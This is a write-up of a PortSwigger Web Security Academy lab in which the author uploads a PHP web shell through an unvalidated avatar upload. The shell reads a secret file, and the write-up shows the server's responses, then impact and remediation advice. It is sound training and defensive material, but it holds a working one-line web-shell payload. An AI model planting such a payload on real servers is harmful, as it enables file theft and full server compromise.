# PortSwigger Lab: [LAB NAME]

# TAGS: 

# Lab Information:

- **Vulnerability Location:** Remote code execution via web shell upload
- **Difficulty:** Apprentice
- **Objective:** Exfiltrate the file `/home/carlos/secret`using a web shell. ``
- **Tools:** Burp Suite,
- **Provided Credentials:** wiener:peter

---

## Reconnaissance:

#### Lab Description lookup:

The lab description says that the application has an image upload function and that the server does not validate the file before storing it.

With Burp running, I navigated directly to /my-account and logged in using the credentials provided by the lab (**wiener:peter**).

Once logged in, I found a function to upload a profile image — probably the one mentioned in the lab description.

---

## Exploitation:

#### Step 1:  Test if the image upload function accepts a web shell

I created a file called shell.php with the following content:

```bash
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

- file_get_contents is a PHP function that reads the contents of a file into a string.
- /home/carlos/secret is the file indicated in the lab description.

Then I uploaded the file through the avatar upload function:

```bash
HTTP/2 200 OK
Date: Wed, 16 Sep 2026 12:59:45 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 132

The file avatars/shell.php has been uploaded.<p><a href="/my-account" title="Return to previous page">« Back to My Account</a></p>
```

The server accepted the .php file without any validation and kept the original filename, storing it in the avatars directory. Since the file kept its .php extension, the next step was to access it and see whether the server executes it.

#### Step 2: Access the uploaded file

After uploading the file, I had to access it in order to see its output.

I clicked to open the picture in a new tab. Instead of an image, the response showed the contents of Carlos's secret file:

```bash
HTTP/2 200 OK
Date: Wed, 16 Sep 2026 12:59:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
X-Frame-Options: SAMEORIGIN
Content-Length: 32
[REDACTED]
```

The server executed the PHP code and returned the secret. I submitted the content as the lab solution and the lab was solved.

![image.png](PortSwigger%20Lab%20Remote%20code%20execution%20via%20web%20shel/image.png)

---

## Impact

Uploading a web shell gives an attacker remote code execution (RCE) on the server, with the privileges of the web application. In this lab, it took nothing more than renaming a file to .php.

In real-world applications, this is a critical vulnerability. An attacker could read arbitrary files, modify or destroy data, install a persistent backdoor, or pivot into internal systems — leading to full server compromise.

---

## Remediation

To prevent this issue, applications should:

- Validate uploaded files server-side using an allow-list of extensions, and verify the file's content (e.g., MIME type and magic bytes), not just its name;
- Never store user uploads in a location the web server executes — serve them from a separate domain or static storage with scripting disabled;
- Randomize uploaded file names instead of preserving attacker-controlled paths;
- Run the application with the least privileges necessary, so that code execution does not immediately grant full access to the system.

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.